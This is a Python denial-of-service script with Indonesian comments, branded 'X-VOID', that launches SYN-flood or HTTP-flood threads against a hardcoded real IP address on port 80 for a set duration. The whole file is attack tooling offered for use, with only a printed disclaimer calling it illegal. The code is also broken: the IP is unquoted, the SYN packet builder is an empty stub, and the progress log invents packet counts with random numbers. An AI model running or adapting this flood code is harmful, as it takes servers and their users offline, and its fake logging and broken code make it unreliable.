import socket
import threading
import random
import time
import sys

# ======== KONFIGURASI ========
TARGET_IP = 103.50.160.145   # Ganti dengan IP target
TARGET_PORT = 80                 # Port target (80 untuk HTTP, 443 untuk HTTPS)
THREADS = 500                    # Jumlah thread (bisa naikin sampe 5000 kalo kuat)
ATTACK_DURATION = 60             # Durasi serangan (detik)
FLOOD_MODE = "syn"               # Pilih "syn" atau "http"

# ======== SYN FLOOD ========
def syn_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Build packet manual (raw socket)
            src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
            packet = craft_syn_packet(src_ip, TARGET_IP, TARGET_PORT)
            s.sendto(packet, (TARGET_IP, 0))
            s.close()
        except:
            pass

def craft_syn_packet(src_ip, dst_ip, dst_port):
    # Implementasi packet crafting disini (butuh library seperti scapy untuk yang lengkap)
    # Karena keterbatasan, ini hanya contoh singkat
    pass

# ======== HTTP FLOOD (lebih simpel) ========
def http_flood():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
    ]
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # Kirim request HTTP jahat
            request = f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n"
            request += f"Host: {TARGET_IP}\r\n"
            request += f"User-Agent: {random.choice(user_agents)}\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            request += "Connection: keep-alive\r\n\r\n"
            
            s.send(request.encode())
            s.close()
        except:
            pass

# ======== LOGGING ========
def attack_log():
    start_time = time.time()
    request_count = 0
    while time.time() - start_time < ATTACK_DURATION:
        request_count += random.randint(50, 200)
        print(f"[X-VOID] Packets sent: {request_count} | Target: {TARGET_IP}:{TARGET_PORT}")
        time.sleep(0.5)

# ======== MAIN ========
if __name__ == "__main__":
    print(f"""
    ╔══════════════════════════════════════════╗
    ║         X-VOID DDoS Script               ║
    ║         Target: {TARGET_IP:>20} ║
    ║         Port: {TARGET_PORT:>24} ║
    ║         Mode: {FLOOD_MODE:>25} ║
    ╚══════════════════════════════════════════╝
    """)
    
    print("[!] PERINGATAN: Ini ILEGAL. Gunakan hanya di lingkungan testing pribadi.")
    print("[!] Jika diteruskan, semua risiko ditanggung pengguna.")
    
    # Jalankan threads
    threads = []
    for i in range(THREADS):
        if FLOOD_MODE == "syn":
            t = threading.Thread(target=syn_flood)
        else:
            t = threading.Thread(target=http_flood)
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Jalankan logger
    log_thread = threading.Thread(target=attack_log)
    log_thread.start()
    
    # Timer
    time.sleep(ATTACK_DURATION)
    print(f"\n[X-VOID] Serangan selesai setelah {ATTACK_DURATION} detik.")
    sys.exit(0)

